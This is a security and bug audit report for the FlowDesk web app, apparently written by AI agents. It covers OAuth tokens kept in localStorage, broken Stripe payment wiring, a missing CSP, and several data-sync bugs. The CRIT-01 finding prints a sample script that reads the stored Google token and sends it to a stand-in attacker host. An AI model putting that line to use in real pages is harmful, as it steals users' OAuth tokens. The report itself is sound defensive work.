# FlowDesk Codebase Audit Report
**Date:** 2026-03-18
**Branch:** eash/ux-sweep-onboarding
**Scope:** index.html, auth.html, onboarding.html, dashboard.html, supabase.js
**Method:** 4 parallel specialized agents — bug-hunter, security-auditor, stripe-auditor, code-reviewer

---

## Executive Summary

The FlowDesk codebase is functionally well-structured with a consistent design system, good use of `escapeHtml()` for XSS prevention on user-authored text, and correct Supabase RLS filtering. However, the audit uncovered **2 Critical**, **9 High**, and **15 Medium/Low** issues across security, payment infrastructure, and data integrity.

The most urgent problems are:

1. **Google Calendar OAuth uses the deprecated implicit flow** — OAuth tokens are stored in `localStorage` and transiently exposed in browser history (Critical).
2. **Stripe payment infrastructure is entirely non-functional** — both buy buttons are placeholder strings and there is no webhook to fulfill subscriptions (Critical).
3. **Supabase write failures are silently ignored** throughout the dashboard — task toggles, deletes, and habit saves leave the UI out of sync with the database on any error (High, multiple locations).
4. **No Content Security Policy** on any page, and all CDN scripts lack SRI hashes (High).

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 9 |
| Medium | 10 |
| Low | 8 |

---

## Critical Issues

### CRIT-01 — Google Calendar OAuth Implicit Flow Stores Token in localStorage

**File:** `dashboard.html` — `gcalHandleRedirect()`, `gcalConnect()`
**Category:** Security — A07 Identification and Authentication Failures

The Google Calendar integration uses `response_type: 'token'` (implicit flow, deprecated by Google and IETF RFC 9700). After authorization, the access token is extracted from `location.hash` and written to `localStorage`:

```js
localStorage.setItem(GCAL_TOKEN_KEY, token);
localStorage.setItem(GCAL_EXPIRY_KEY, String(Date.now() + expiresIn * 1000));
```

`localStorage` is readable by any JavaScript on the same origin. Combined with the missing CSP (see HIGH-02), any injected script can exfiltrate the token:

```js
const stolen = localStorage.getItem('flowdesk-gcal-token');
fetch('https://attacker.example/steal?t=' + stolen);
```

The token is also transiently present in the URL fragment (visible to browser history and extensions running before `history.replaceState` clears it).

**Remediation:**
- Migrate to Authorization Code + PKCE (`response_type=code&code_challenge=...`) via a Supabase Edge Function or Cloudflare Worker for token exchange.
- Short-term: use `sessionStorage` instead of `localStorage` so the token clears on tab close.
- Ensure `history.replaceState` runs synchronously before any other page-load code.

---

### CRIT-02 — Stripe Payment Infrastructure Is Completely Non-Functional

**File:** `index.html` lines 884, 899
**Category:** Business Logic — Revenue Flow Broken

Both paid plan buy buttons use unfilled template strings:

```html
href="PASTE_PRO_PAYMENT_LINK_HERE"
href="PASTE_GROUP_PAYMENT_LINK_HERE"
```

No Stripe SDK, no Checkout Session, no Payment Link URL. Clicking either button on the live site navigates nowhere.

Additionally, there is no server-side webhook anywhere in the codebase. GitHub Pages is purely static. When a user completes a payment, nothing updates `profiles.subscription_status` in Supabase. The post-payment success modal (`index.html:1309`) fires solely based on `?plan=group` in the URL — anyone can trigger it without paying by crafting the URL manually.

**Remediation (ordered):**
1. Create a `subscription_status` column on `profiles` (`CHECK` constraint: `free|pro|group`, default `free`).
2. Build a Supabase Edge Function (`stripe-webhook`) that verifies the `Stripe-Signature` header and handles `checkout.session.completed` and `customer.subscription.updated/deleted`.
3. Replace placeholder `href` values with real Stripe Payment Links. Pass `client_reference_id={supabase_user_id}` so the webhook can match payment to user.
4. Gate the success modal on actual `subscription_status` from Supabase, not the URL query param.

---

## Security Vulnerabilities

### SEC-01 — Supabase Anon Key Committed to Public Repository

**File:** `supabase.js` lines 8–9
**Severity:** High

The Supabase anon key is verbatim in a public GitHub Pages repo. While RLS-protected, public exposure enables API enumeration, brute-force auth attempts, and rate-limit exhaustion. If RLS is ever misconfigured, all user data becomes readable. The key cannot be rotated without breaking all live pages simultaneously.

**Remediation:** This is a structural constraint of the GitHub Pages architecture. Document it explicitly, verify RLS is airtight on all tables, and restrict the Google OAuth Client ID's allowed origins to `https://kolimoli1.github.io` only. Consider proxying requests through a Cloudflare Worker to hide the key from source.

---

### SEC-02 — No Content Security Policy; CDN Scripts Lack SRI Hashes

**File:** All pages — `<head>` sections
**Severity:** High

No page sets a CSP header or `<meta http-equiv="Content-Security-Policy">`. Scripts are loaded from three CDNs (`cdn.jsdelivr.net`, `cdnjs.cloudflare.com`, `fonts.googleapis.com`) with no Subresource Integrity hashes. A CDN compromise would deliver malicious scripts to all users with full origin access (including the anon key and any OAuth tokens in `localStorage`). Clickjacking via iframe embedding is also unprotected.

**Remediation:**
```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' cdn.jsdelivr.net cdnjs.cloudflare.com;
  style-src 'self' fonts.googleapis.com 'unsafe-inline';
  font-src fonts.gstatic.com;
  connect-src https://teovjlyddhbiauadojsa.supabase.co https://www.googleapis.com;
  frame-ancestors 'none';
">
```
Add SRI `integrity` attributes to all CDN `<script>` and `<link>` tags.

---

### SEC-03 — XSS Surface: Task/Habit IDs Interpolated Raw into onclick Attributes

**File:** `dashboard.html` — `renderTasks()`, `renderHabits()`, `updateDashStats()`
**Severity:** High

UUIDs are interpolated directly into onclick strings:

```js
`<button onclick="toggleTask('${t.id}')">`
`<button onclick="deleteTask('${t.id}')">`
```

Supabase UUIDs are system-generated and safe today. However, the pattern is structurally injectable — if IDs ever become client-influenced or a DB breach injected crafted values, an apostrophe in `t.id` breaks out of the JS string context.

**Remediation:** Replace inline onclick strings with `data-*` attributes and `addEventListener`:
```js
const btn = document.createElement('button');
btn.dataset.id = t.id;
btn.addEventListener('click', () => toggleTask(btn.dataset.id));
```

---

### SEC-04 — OAuth Redirects Use window.location.origin (Reflected Origin Risk)

**File:** `auth.html` — `googleLogin()`
**Severity:** Low

`redirectTo: window.location.origin + '/auth.html'` — if the site is ever served from an attacker-controlled domain (subdomain takeover), OAuth callbacks redirect there. Supabase's redirect allowlist mitigates this only if kept strict.

**Remediation:** Hardcode as `https://kolimoli1.github.io/auth.html`. Verify the Supabase redirect URL allowlist contains only the production domain.

---

### SEC-05 — No Input Length Validation on Task/Habit/Course Names

**File:** `dashboard.html` — `insertTask()`, `saveHabit()`; `onboarding.html` — `addCourse()`
**Severity:** Medium

No `maxlength` attribute or JS length check before sending to Supabase. Extremely long strings can break UI layouts or exceed DB column limits.

**Remediation:** Add `maxlength="200"` (tasks), `maxlength="50"` (courses/habits) to all inputs. Add matching DB column constraints in Supabase.

---

### SEC-06 — focusSecondsToday Persisted in Plaintext localStorage — Tamper-able

**File:** `dashboard.html` — `getFocusLog()`, `setFocusLog()`
**Severity:** Medium

The focus/pomodoro log is stored in `localStorage` as plain JSON. Any script on the same origin (or the user via DevTools) can falsify focus stats:
```js
localStorage.setItem('flowdesk-focus-log', JSON.stringify({"2026-03-18": 999999}));
```

**Remediation:** Persist focus sessions to a Supabase `focus_sessions` table (`user_id`, `date`, `seconds`). Use localStorage only as an ephemeral write-back cache.

---

## Bugs & Logic Errors

### BUG-01 — renderHabits Overwrites dashStreak on Every Iteration — Last Habit Wins

**File:** `dashboard.html` — `renderHabits()`
**Severity:** High

`document.getElementById('dashStreak').textContent` is set as a side effect inside the `habits.map()` loop. The dashboard streak card always shows the streak of the *last* habit in the array, not the best or total streak. If habits are reordered, the displayed value is arbitrary.

**Fix:** Move streak calculation to `updateDashStats()`. Compute `Math.max(...habits.map(h => calcStreak(h.completions||[])))` there once. Remove the side effect from `renderHabits()`.

---

### BUG-02 — deleteTask Has No Error Handling — Silent Data Loss on Supabase Failure

**File:** `dashboard.html` — `deleteTask()`
**Severity:** High

The local `tasks[]` array is filtered and re-rendered *before* the Supabase DELETE resolves. The DELETE result is never checked. If the call fails (network error, RLS rejection), the task disappears from the UI but survives in the database. On next reload it reappears, creating confusing ghost-task behavior.

**Fix:** Capture `{ error }` from the DELETE call. On error, restore the task to `tasks[]`, re-render, and show an error toast — same pattern used in `insertTask`.

---

### BUG-03 — toggleTask Optimistic Mutation Never Rolled Back on Supabase Error

**File:** `dashboard.html` — `toggleTask()`
**Severity:** High

`task.done` is flipped in memory and the 350ms timeout fires `renderTasks()` / `updateDashStats()` / `renderPlanner()` — all before `sb.from('tasks').update(...)` resolves. If the update fails, the local state is permanently wrong. The user sees the task as done; the DB still has it as undone. Reload corrects it silently with no user feedback.

**Fix:** Await the Supabase call result; on error, revert `task.done`, re-render, and show a toast.

---

### BUG-04 — saveHabit Has No Error Path — Submit Gets Stuck on Failure

**File:** `dashboard.html` — `saveHabit()`
**Severity:** High

When `error` is truthy, the `if (!error && data)` branch is skipped with no `else` block. No toast, no re-enable of the submit button, no user feedback. The modal stays open and the user must hard-close it. The failed habit is not saved.

**Fix:** Add an `else { showToast('Could not save habit', 'error'); }` block and re-enable the submit button.

---

### BUG-05 — toggleHabit Has No Error Handling — Completions Array Diverges from DB

**File:** `dashboard.html` — `toggleHabit()`
**Severity:** High

`habits.update()` result is not checked. A failed write leaves the local `completions[]` array diverged from the database. The UI shows the habit as complete; the DB does not record it.

**Fix:** Check the update result; on error, revert the local `completions` array change and show a toast.

---

### BUG-06 — finishOnboarding Race Condition — currentUser May Not Be Set

**File:** `onboarding.html` — `finishOnboarding()`
**Severity:** High

The auth guard IIFE sets `currentUser` asynchronously. `finishOnboarding()` guards with `if (!currentUser) return` but a user who clicks the button before the IIFE resolves gets a silent no-op with no feedback. The `waitForUser()` polling function exists but is not used in `finishOnboarding()`.

**Fix:** Replace `if (!currentUser) return` with `const user = await waitForUser(); if (!user) { showError(); return; }`.

---

### BUG-07 — "Tasks Today" Stat Shows All Pending Tasks, Not Today's Tasks

**File:** `dashboard.html` — `updateDashStats()`
**Severity:** Medium

The "Tasks today" dashboard card uses `tasks.filter(t => !t.done).length` — the total undone backlog. The label says "today" but the number includes all tasks past-due and future-due. Misleading for users with a large backlog.

**Fix:** Filter by `t.due_date === toLocalDateString()` or rename the card to "Pending tasks".

---

### BUG-08 — completePom Uses nth-child Selector for Mode Button — Brittle

**File:** `dashboard.html` — `completePom()`
**Severity:** Medium

```js
setPomMode(bm, document.querySelector(`.pom-mode-btn:nth-child(${bm==='short'?2:3})`))
```
If the HTML order of `.pom-mode-btn` buttons ever changes, the wrong button gets the `active` class. A `null` return from `querySelector` would throw.

**Fix:** Use `data-mode` attributes: `document.querySelector(`.pom-mode-btn[data-mode="${bm}"]`)`.

---

### BUG-09 — openModal Leaks keydown Listener if a Second Modal Opens Without Closing the First

**File:** `dashboard.html` — `openModal()` / `closeModal()`
**Severity:** Medium

`_focusTrapHandler` is a single shared variable. Calling `openModal()` a second time without closing overwrites the handler reference. The original listener remains attached to `document` but now references stale closure variables. Each subsequent open without a close accumulates a dangling listener.

**Fix:** `if (_focusTrapHandler) document.removeEventListener('keydown', _focusTrapHandler)` at the top of `openModal()` before attaching the new one.

---

### BUG-10 — renderAnalytics doneThisWeek Uses updated_at, Not Actual Completion Date

**File:** `dashboard.html` — `renderAnalytics()`
**Severity:** Low

`doneThisWeek` filters with `t.done && t.updated_at >= last7[0]`. Tasks toggled done → undone → done will have a fresh `updated_at` regardless of when they were first completed. Tasks completed before last week but re-toggled this week are incorrectly counted.

**Fix:** Add a dedicated `completed_at` column set only when `done` transitions to `true`.

---

### BUG-11 — gcalFetchEvents Has No Error Handling on fetch()

**File:** `dashboard.html` — `gcalFetchEvents()`
**Severity:** Medium

`await fetch(...)` is bare with no try/catch or `.catch()`. A network error produces an unhandled promise rejection and the calendar UI stalls with no user feedback.

**Fix:** Wrap in try/catch; show a toast and fall back gracefully on failure.

---

### BUG-12 — Auth Guard IIFE Has No Error Handling on onboarding.html and auth.html

**File:** `onboarding.html`, `auth.html`
**Severity:** Medium

The async IIFEs that call `sb.auth.getSession()` and the subsequent `profiles` query have no try/catch. A Supabase failure produces an unhandled rejection and the user sees a blank/stuck page.

**Fix:** Wrap both IIFE bodies in try/catch; redirect to `auth.html` with an error message on failure.

---

## Code Quality Issues

### QUAL-01 — No Double-Submit Protection on Task/Habit Add Forms

**File:** `dashboard.html` — `insertTask()`, `saveTask()`, `saveTaskFromModal()`
**Severity:** Medium

The "Add task" button is not disabled while the Supabase insert is awaiting. Rapid clicks fire multiple simultaneous inserts, creating duplicate tasks. Same issue in `saveHabit()`.

**Fix:** Disable the submit button before the `await`, re-enable in the `finally` block.

---

### QUAL-02 — escapeHtml() and toLocalISOString() Duplicated Across Files

**File:** `dashboard.html` and `onboarding.html`
**Severity:** Low

Both helpers are defined identically in two files. A bug fix in one will not propagate to the other.

**Fix:** Move to `supabase.js` and export, or create a shared `utils.js`. (Note: adding a file is acceptable; all pages already import `supabase.js`.)

---

### QUAL-03 — Missing Accessibility: aria-current, aria-label, role on Interactive Elements

**File:** `dashboard.html`
**Severity:** Medium

- Sidebar nav buttons have no `aria-current="page"` updated on `switchView()`.
- `.pom-mode-btn` buttons have no `role="tab"`; the container has no `role="tablist"`.
- Planner quick-add `+` buttons have no `aria-label` — screen readers announce them identically.
- Sidebar icon buttons (settings, logout) use emoji as sole content without `aria-label`.

---

### QUAL-04 — deleteTask Has No Confirmation or Undo

**File:** `dashboard.html` — `deleteTask()`
**Severity:** Medium

A single click immediately and irreversibly deletes a task from the DB and UI. No confirm dialog, no undo toast with a timeout.

**Fix:** Show a "Task deleted. Undo?" toast with a 5-second window that reverses the delete if clicked.

---

### QUAL-05 — No Client-Side Validation Before Supabase Auth Calls

**File:** `auth.html`
**Severity:** Low

Password length and email format are delegated entirely to Supabase. The loading state activates on obviously invalid input, slowing feedback. HTML `minlength` and `type="email"` are present but no JS pre-validation runs.

**Fix:** Check `email.includes('@')` and `password.length >= 8` before calling Supabase; show inline error messages immediately.

---

### QUAL-06 — renderPlanner Called Redundantly After renderTasks

**File:** `dashboard.html` — `toggleTask()`, `deleteTask()`
**Severity:** Low

`renderTasks()` already calls `renderPlanner()` at its end. Call sites that do `renderTasks(); renderPlanner();` call it twice per operation.

**Fix:** Remove the redundant `renderPlanner()` calls at those call sites.

---

### QUAL-07 — SVG Ring strokeDasharray is a Magic Number

**File:** `dashboard.html` — pomodoro ring SVG
**Severity:** Low

`strokeDasharray="678.6"` is the circumference of the ring (2πr where r=108) hardcoded. If the ring size changes, the animation silently breaks.

**Fix:** Derive at runtime: `const C = 2 * Math.PI * 108; ring.style.strokeDasharray = C;`

---

### QUAL-08 — Onboarding Step 1 Has No Enforced Field Validation

**File:** `onboarding.html` — `goStep(2)`
**Severity:** Low

The "Continue" button calls `goStep(2)` without checking that `state.field` is set. A user can advance with `state.field = null`, which is then written to `profiles.field` in Supabase.

**Fix:** `if (!state.field) { /* show hint */ return; }` before advancing.

---

### QUAL-09 — Google OAuth Redirect Bounces Through auth.html Unnecessarily

**File:** `auth.html` — `googleLogin()`
**Severity:** Low

`redirectTo` points to `auth.html`, which then re-checks the session and routes forward. This adds a round-trip redirect and a timing window where session-read failure leaves the user stranded.

**Fix:** Set `redirectTo` to `onboarding.html` directly (it already handles the already-onboarded redirect case).

---

## Stripe Findings

### STRIPE-01 — Payment Links Are Unfilled Placeholder Strings (Critical, see CRIT-02)

Already covered above. Revenue flow is entirely broken.

---

### STRIPE-02 — No Webhook — Subscription Status Never Written After Payment (Critical, see CRIT-02)

Already covered above. Stripe has no way to notify the app that a payment succeeded.

---

### STRIPE-03 — subscription_status Column May Not Exist in Database

**File:** `dashboard.html` lines 659–665
**Severity:** High

`p?.subscription_status` is read and silently falls back to `'Free plan'` if null. Per CLAUDE.md, the column name is not yet confirmed. The column may not exist, and even if it does, no mechanism currently sets it to anything other than null.

**Fix:** Coordinate with the Stripe webhook build (CRIT-02). Create the column with `CHECK (subscription_status IN ('free','pro','group'))` and `DEFAULT 'free'`. Wire the webhook to set it on payment success.

---

### STRIPE-04 — Success Modal Gated by URL Query Param Only

**File:** `index.html` line 1309
**Severity:** High

`if (urlParams.get('plan') === 'group')` shows the "Welcome to Pro" modal. Anyone can trigger this without paying. There is no session token, Supabase lookup, or cryptographic verification.

**Fix:** After wiring the webhook, verify subscription status from Supabase before showing the success modal. Never trust URL params for access decisions.

---

### STRIPE-05 — No Error Handling on Payment Failure Paths

**File:** `index.html` — buy button anchors
**Severity:** Medium

Once real Payment Links are wired, failed payments and card declines will return the user with no feedback. No `?error=true` branch is handled.

**Fix:** Add a Stripe Payment Link "cancel URL" that sets `?checkout=cancelled` and handle it with a friendly error message.

---

## What Is Working Well

- `escapeHtml()` is consistently used when rendering user-authored text into `innerHTML` — no XSS found in user content rendering.
- All Supabase queries correctly filter by `user_id` client-side and rely on RLS server-side — defense in depth.
- Auth guard on `dashboard.html` correctly redirects to `auth.html` if no session.
- `textContent` (not `innerHTML`) is correctly used for user name, greeting, and plan label fields.
- `full_name` from profile/metadata is rendered safely via `textContent`.
- No Stripe secret key or any other server-side credentials found in client code.
- The focus log localStorage key is namespaced (`flowdesk-focus-log`) — no collision risk with other apps.
- `removeCourse(i)` in onboarding uses a numeric index — not prototype-pollution-vulnerable.
- Course deduplication and 8-course cap are enforced client-side in onboarding.

---

## Priority Remediation Order

| Priority | ID | Issue | Effort |
|----------|----|-------|--------|
| P0 | CRIT-02 | Wire Stripe: create column + Edge Function webhook + real Payment Links | High |
| P0 | CRIT-01 | Migrate Google Calendar OAuth from implicit to PKCE | Medium |
| P1 | BUG-02 | Add error handling to deleteTask with optimistic rollback | Low |
| P1 | BUG-03 | Add error handling to toggleTask with optimistic rollback | Low |
| P1 | BUG-04 | Add error path to saveHabit | Low |
| P1 | BUG-05 | Add error handling to toggleHabit | Low |
| P1 | BUG-01 | Fix dashStreak overwrite in renderHabits loop | Low |
| P1 | BUG-06 | Fix finishOnboarding race condition | Low |
| P2 | SEC-02 | Add CSP meta tags + SRI hashes to all pages | Medium |
| P2 | SEC-03 | Replace inline onclick ID interpolation with data-* + addEventListener | Medium |
| P2 | STRIPE-03 | Confirm subscription_status column exists in Supabase | Low |
| P2 | STRIPE-04 | Gate success modal on real subscription status | Low |
| P3 | QUAL-01 | Add double-submit protection to all async forms | Low |
| P3 | BUG-07 | Fix "Tasks today" stat to filter by today's date | Low |
| P3 | QUAL-03 | Add aria-current, aria-label, role to interactive elements | Medium |
| P3 | BUG-12 | Add try/catch to auth guard IIFEs | Low |
| P4 | SEC-05 | Add maxlength and DB constraints to all text inputs | Low |
| P4 | QUAL-04 | Add confirmation/undo to deleteTask | Low |
| P4 | SEC-06 | Persist focus sessions to Supabase | Medium |
| P4 | QUAL-02 | DRY up escapeHtml/toLocalISOString into supabase.js | Low |

---

*Audit conducted 2026-03-18. Next audit recommended after Stripe integration is complete.*
